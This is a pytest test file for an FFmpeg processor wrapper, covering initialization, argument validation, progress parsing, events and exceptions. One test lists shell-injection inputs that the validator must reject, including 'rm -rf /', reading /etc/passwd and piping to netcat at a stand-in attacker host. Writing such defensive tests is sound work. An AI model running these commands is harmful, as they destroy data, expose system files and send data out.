import os
import shutil
from unittest.mock import MagicMock, patch

import pytest

from tidal.utilities.ffmpeg import (
	BatchProcessor,
	EventType,
	FFmpegError,
	FFmpegProcessor,
	FFmpegProcessError,
	FFmpegSecurityError,
	FFmpegTimeoutError,
	ProgressData,
	simple_convert,
)


class TestFFmpegProcessorInit:
	def test_default_initialization(self):
		"""Test that FFmpegProcessor initializes with defaults."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		assert processor.timeout == 3600
		assert processor.max_memory_mb == 2048
		assert processor.ffmpeg_path is not None

	def test_custom_timeout(self):
		"""Test custom timeout setting."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor(timeout=600)
		assert processor.timeout == 600

	def test_invalid_ffmpeg_path(self):
		"""Test that invalid FFmpeg path raises error."""
		with pytest.raises(FFmpegSecurityError, match="Invalid FFmpeg path"):
			FFmpegProcessor(ffmpeg_path="/nonexistent/ffmpeg")


class TestArgumentValidation:
	def test_valid_arguments(self):
		"""Test that valid arguments pass validation."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._validate_arguments(["-i", "input.mp4", "-c:v", "libx264", "output.mp4"])
		assert len(result) == 5

	def test_shell_injection_blocked(self):
		"""Test that shell injection characters are blocked."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()

		dangerous_inputs = [
			"input.mp4; rm -rf /",
			"input.mp4 && cat /etc/passwd",
			"input.mp4 | nc evil.com",
			"$(whoami)",
			"input.mp4`id`",
		]

		for dangerous_input in dangerous_inputs:
			with pytest.raises(FFmpegSecurityError, match="dangerous"):
				processor._validate_arguments([dangerous_input])

	def test_non_string_arguments_rejected(self):
		"""Test that non-string arguments are rejected."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()

		with pytest.raises(FFmpegSecurityError, match="strings"):
			processor._validate_arguments([123, "test"])  # type: ignore

	def test_non_list_arguments_rejected(self):
		"""Test that non-list arguments are rejected."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()

		with pytest.raises(FFmpegSecurityError, match="list"):
			processor._validate_arguments("not a list")  # type: ignore


class TestProgressParsing:
	def test_parse_frame(self):
		"""Test parsing frame count from progress output."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._parse_progress_line("frame=150")
		assert result is not None
		assert result.frame == 150

	def test_parse_fps(self):
		"""Test parsing FPS from progress output."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._parse_progress_line("fps=29.97")
		assert result is not None
		assert result.fps == 29.97

	def test_parse_time_microseconds(self):
		"""Test parsing time in microseconds."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._parse_progress_line("out_time_ms=5000000")
		assert result is not None
		assert result.time_seconds == 5.0

	def test_parse_progress_percent_with_duration(self):
		"""Test that progress percentage is calculated when duration is known."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._parse_progress_line("out_time_ms=5000000", total_duration=10.0)
		assert result is not None
		assert result.progress_percent == 50.0

	def test_parse_empty_line(self):
		"""Test that empty/irrelevant lines return None."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		result = processor._parse_progress_line("some_other_key=value")
		assert result is None


class TestEventSystem:
	def test_register_and_emit_event(self):
		"""Test event handler registration and emission."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		received_events = []

		processor.on(EventType.STARTED, lambda data: received_events.append(data))
		processor._emit_event(EventType.STARTED, {"test": True})

		assert len(received_events) == 1
		assert received_events[0] == {"test": True}

	def test_multiple_handlers(self):
		"""Test multiple handlers for the same event."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		counts = {"handler1": 0, "handler2": 0}

		processor.on(EventType.COMPLETED, lambda data: counts.update({"handler1": counts["handler1"] + 1}))
		processor.on(EventType.COMPLETED, lambda data: counts.update({"handler2": counts["handler2"] + 1}))
		processor._emit_event(EventType.COMPLETED, None)

		assert counts["handler1"] == 1
		assert counts["handler2"] == 1

	def test_handler_error_logged_not_raised(self):
		"""Test that handler errors are logged but don't crash emission."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		successful_calls = []

		def bad_handler(data):
			raise RuntimeError("Handler error")

		def good_handler(data):
			successful_calls.append(data)

		processor.on(EventType.STARTED, bad_handler)
		processor.on(EventType.STARTED, good_handler)

		# Should not raise
		processor._emit_event(EventType.STARTED, "test_data")

		# Good handler should still have been called
		assert len(successful_calls) == 1


class TestProgressData:
	def test_default_values(self):
		data = ProgressData()
		assert data.frame is None
		assert data.fps is None
		assert data.time_seconds is None
		assert data.bitrate is None
		assert data.speed is None
		assert data.size is None
		assert data.progress_percent is None
		assert data.status == "processing"


class TestExceptionHierarchy:
	def test_ffmpeg_error_base(self):
		error = FFmpegError("test error", exit_code=1, stderr="err")
		assert str(error) == "test error"
		assert error.exit_code == 1
		assert error.stderr == "err"

	def test_timeout_error_is_ffmpeg_error(self):
		error = FFmpegTimeoutError("timeout")
		assert isinstance(error, FFmpegError)

	def test_security_error_is_ffmpeg_error(self):
		error = FFmpegSecurityError("security issue")
		assert isinstance(error, FFmpegError)

	def test_process_error_is_ffmpeg_error(self):
		error = FFmpegProcessError("process failed", exit_code=1, stderr="err")
		assert isinstance(error, FFmpegError)
		assert error.exit_code == 1


class TestGetMediaDuration:
	def test_get_duration_real_file(self, sample_video, ffprobe_available):
		"""Test getting duration from a real video file."""
		if not ffprobe_available:
			pytest.skip("ffprobe not available")

		processor = FFmpegProcessor()
		duration = processor._get_media_duration(sample_video)

		assert duration is not None
		assert duration > 0
		assert duration < 10  # Our test video is 2 seconds

	def test_get_duration_nonexistent_file(self):
		"""Test that getting duration of nonexistent file returns None."""
		if not shutil.which("ffmpeg"):
			pytest.skip("FFmpeg not available")

		processor = FFmpegProcessor()
		duration = processor._get_media_duration("/nonexistent/file.mp4")

		assert duration is None
